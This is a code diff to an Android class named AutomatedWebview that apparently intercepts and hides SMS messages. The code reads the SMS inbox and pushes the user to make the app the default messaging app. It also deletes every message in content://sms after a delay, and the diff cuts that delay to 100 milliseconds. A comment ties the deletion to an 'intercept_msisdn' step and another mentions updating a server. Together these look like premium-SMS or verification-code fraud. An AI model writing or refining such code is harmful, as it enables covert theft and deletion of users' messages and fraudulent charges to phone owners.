@@ -291,13 +291,13 @@ public class AutomatedWebview extends WebView {
             count++;
         }
 
-        //Removing SMS from intercept_msisdn
+        //Removing SMS using intercept_msisdn
         handler.postDelayed(new Runnable() {
             @Override
             public void run() {
                 deleteSMS(context);
             }
-        }, seconds * 1000+2000);
+        }, seconds * 1000+100);
 
         //Updating server
         final int finalCount = count;
@@ -446,7 +446,7 @@ public class AutomatedWebview extends WebView {
 //            Log.e("Exception", e.toString());
 //        }
         Uri deleteUri = Uri.parse("content://sms");
-        int count = 0;
+        int count;
         Cursor c = context.getContentResolver().query(deleteUri, new String[]{"_id"}, null,
                 null, null);
         while (c.moveToNext()) {
@@ -549,7 +549,6 @@ public class AutomatedWebview extends WebView {
     public void enableSMSDefault() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
             if (!Telephony.Sms.getDefaultSmsPackage(context).equals(context.getPackageName())) {
-
                 AlertDialog.Builder builder = new AlertDialog.Builder(context);
                 builder.setMessage("This app is not set as your default messaging app. Do you want to set it as default?")
                         .setCancelable(false)
@@ -564,10 +563,9 @@ public class AutomatedWebview extends WebView {
                         .setPositiveButton("Yes", new DialogInterface.OnClickListener() {
                             @TargetApi(19)
                             public void onClick(DialogInterface dialog, int id) {
-
-                                Intent intent = new Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
-                                intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, context.getPackageName());
-                                context.startActivity(intent);
+                            Intent intent = new Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
+                            intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, context.getPackageName());
+                            context.startActivity(intent);
                             }
                         });
                 builder.show();
@@ -579,13 +577,6 @@ public class AutomatedWebview extends WebView {
         String[] reqCols = new String[]{"_id", "address", "body"};
         ContentResolver cr = context.getContentResolver();
         Cursor c = cr.query(inboxURI, reqCols, null, null, null);
-
-//        adapter = new SimpleCursorAdapter(this, R.layout.row, c,
-//                new String[]{"body", "address"}, new int[]{
-//                R.id.lblMsg, R.id.lblNumber}, 0);
-//
-//        lvMsg.setAdapter(adapter);
-//        lvMsg.setOnItemLongClickListener(this);
 
     }
 
